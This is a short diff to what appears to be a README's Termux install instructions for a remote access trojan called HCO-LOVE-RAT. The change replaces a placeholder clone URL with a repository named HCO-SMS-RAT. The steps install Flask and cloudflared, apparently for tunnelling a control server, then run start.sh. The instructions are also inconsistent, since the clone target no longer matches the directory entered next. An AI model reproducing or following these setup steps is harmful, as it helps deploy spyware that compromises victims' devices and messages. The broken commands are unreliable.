@@ -30,7 +30,7 @@ pkg update -y && pkg upgrade -y
 pkg install python git -y
 pip install flask requests
 pkg install cloudflared -y
-git clone https://github.com/<your-username>/HCO-LOVE-RAT
+git clone https://github.com/Hackerscolonyofficial/HCO-SMS-RAT.git
 cd HCO-LOVE-RAT
 bash start.sh
 ```
